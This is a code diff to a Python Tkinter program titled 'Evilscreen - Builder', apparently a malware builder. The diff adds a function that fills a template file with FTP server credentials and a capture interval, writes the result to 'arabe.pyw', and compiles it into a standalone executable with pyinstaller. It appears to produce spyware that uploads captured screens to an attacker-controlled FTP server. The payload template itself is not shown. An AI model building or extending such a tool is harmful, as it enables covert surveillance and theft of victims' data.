@@ -1,10 +1,31 @@
 from tkinter import *
 from PIL import ImageTk, Image
 from dataclasses import replace
+import os
+import sys
+import subprocess
+import time
 
 #créer la main fenêtre
 window = Tk()
 
+def filemodify():
+    script_location = os.path.split(os.path.realpath(sys.argv[0]))[0] + "\pd.txt"
+    f1 = open(script_location, 'r')
+    f2 = open('arabe.pyw', 'w')
+    
+    for line in f1:
+        line = line.replace('nameeftp', ftpserveur)
+        line = line.replace('usernameftp', ftpusername)
+        line = line.replace('passwordftp', ftppassword)
+        line = line.replace('temps', time)
+        f2.write(line)
+    
+    f1.close()
+    f2.close()
+    subprocess.call(r"pyinstaller --onefile arabe.pyw")
+
+    
 
 def homeclearfirst():
     frame1.destroy()
@@ -112,6 +133,7 @@ def push():
     window.mainloop()
 
 def finish():
+    global time
     time = timeentry.get()
     window.config(background='#310E35')
     window.title("Evilscreen - Builder")
@@ -125,18 +147,7 @@ def finish():
 
     timelabel = Label(frame4, text="Le build est en cours ! :", font=("Courrier", 10), bg='#310E35', fg="white").grid(row=2, column=1, pady=10)
 
-    f1 = open('pd.txt', 'r')
-    f2 = open('arabe.pyw', 'w')
-    
-    for line in f1:
-        line = line.replace('nameeftp', ftpserveur)
-        line = line.replace('usernameftp', ftpusername)
-        line = line.replace('passwordftp', ftppassword)
-        line = line.replace('temps', time)
-        f2.write(line)
-    
-    f1.close()
-    f2.close()
+    filemodify()
 
     frame4.pack()
     window.mainloop()
